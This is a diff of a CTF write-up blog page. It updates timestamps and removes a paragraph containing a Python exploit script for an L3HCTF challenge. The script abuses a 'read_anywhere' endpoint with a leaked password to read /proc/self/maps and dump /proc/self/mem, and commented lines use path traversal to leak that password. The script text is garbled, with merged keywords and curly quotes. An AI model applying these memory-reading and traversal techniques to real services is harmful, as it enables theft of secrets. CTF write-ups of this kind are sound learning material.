@@ -40,7 +40,7 @@
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20250827171732644.png">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20250827171807299.png">
 <meta property="article:published_time" content="2025-06-13T09:01:13.000Z">
-<meta property="article:modified_time" content="2025-08-30T01:59:10.005Z">
+<meta property="article:modified_time" content="2025-11-25T14:07:54.070Z">
 <meta property="article:author" content="xiaolaisec">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="JAVA">
@@ -428,8 +428,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-08-30 09:59:10</span>
-            <span class="mobile">2025-08-30 09:59:10</span>
+            <span class="desktop">2025-11-25 22:07:54</span>
+            <span class="mobile">2025-11-25 22:07:54</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -538,7 +538,6 @@
                       alt="image-20250827155728319"
                 ></p>
 <p>根据提示输入qaq_visible&#x3D;xiyangyang&amp;Lang&#x3D;huitailang</p>
-<p>xxxxxxxxxx #!&#x2F;usr&#x2F;bin&#x2F;env python3import requestsimport re​defget_flag(base_url, password):    print(“\n[+] Stage 2: Attempting to capture flag from process memory…”)    headers &#x3D; {        “X-Gateway-Password”: password    }​    # Step 1: Get the memory map    print(“[+] Reading &#x2F;proc&#x2F;self&#x2F;maps…”)    headers[“X-Gateway-Filename”] &#x3D; “&#x2F;proc&#x2F;self&#x2F;maps”    try:        r &#x3D; requests.get(f”{base_url}&#x2F;read_anywhere”, headers&#x3D;headers, timeout&#x3D;5)        if r.status_code !&#x3D; 200:            print(f”[-] Failed to get memory map. Status: {r.status_code}”)            return​        maps_data &#x3D; r.text        print(“[+] Successfully retrieved memory map.”)​        # Step 2 &amp; 3: Parse map, dump memory regions, and search for flag        headers[“X-Gateway-Filename”] &#x3D; “&#x2F;proc&#x2F;self&#x2F;mem”        for line in maps_data.splitlines():            # Look for readable-writable private memory segments (like heap)            if’rw-p’notin line:                continue​            match &#x3D; re.match(r’([0-9a-f]+)-([0-9a-f]+)’, line)            ifnotmatch:                continue​            start_hex, end_hex &#x3D; match.groups()            start_addr &#x3D; int(start_hex, 16)            end_addr &#x3D; int(end_hex, 16)            size &#x3D; end_addr - start_addr​            print(f”[+] Dumping memory region: {start_hex}-{end_hex} (Size: {size} bytes)”)​            # Read in chunks to avoid hitting server-side limits            chunk_size &#x3D; 1024 * 64# 64KB chunks            for offset inrange(0, size, chunk_size):                current_addr &#x3D; start_addr + offset                read_len &#x3D; min(chunk_size, size - offset)​                headers[“x-gateway-start”] &#x3D; str(current_addr)                headers[“X-Gateway-Length”] &#x3D; str(read_len)​                mem_r &#x3D; requests.get(f”{base_url}&#x2F;read_anywhere”, headers&#x3D;headers, timeout&#x3D;10)                #print(mem_r.text)​                # Use raw content to avoid text decoding issues                flag_match &#x3D; re.search(rb’L3HCTF{[a-zA-Z0-9_]+}‘, mem_r.content)                if flag_match:                    flag &#x3D; flag_match.group(0).decode()                    print(f”\n[+] SUCCESS! Flag found: {flag}”)                    return​    except requests.exceptions.RequestException as e:        print(f”[-] An error occurred during flag capture: {e}”)​​if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:    #target_url&#x3D;”<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1:8088/" >http://127.0.0.1:8088 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“    target_url&#x3D;”<a class="link"   target="_blank" rel="noopener" href="http://1.95.8.146:17794" ​">http://1.95.8.146:17794&quot;​ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>    #第一步拿password    #    # target_url+&#x3D;”&#x2F;download?”    # for i in range(100):    #     target_url+&#x3D;str(i)+”&#x3D;”+”1&amp;”    #    # target_url+&#x3D;”filename&#x3D;%2e%2e%2fproc&#x2F;self&#x2F;fd&#x2F;6”    # my_headers &#x3D; {    #     ‘Range’: ‘bytes&#x3D;41-50’  # 请求从字节0到字节4的部分    # }    # #passwordismemeispasswordsoneverwannagiveyouup    # print(target_url)    # r&#x3D;requests.get(target_url,headers&#x3D;my_headers)    # print(r.text)​    #第二步拿flag​    leaked_password &#x3D; “passwordismemeispasswordsoneverwannagiveyouup”    if leaked_password:        get_flag(target_url, leaked_password)python</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -645,7 +644,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-08-30 09:59:10
+                    :</strong> 2025-11-25 22:07:54
             </li>
         
         <li>
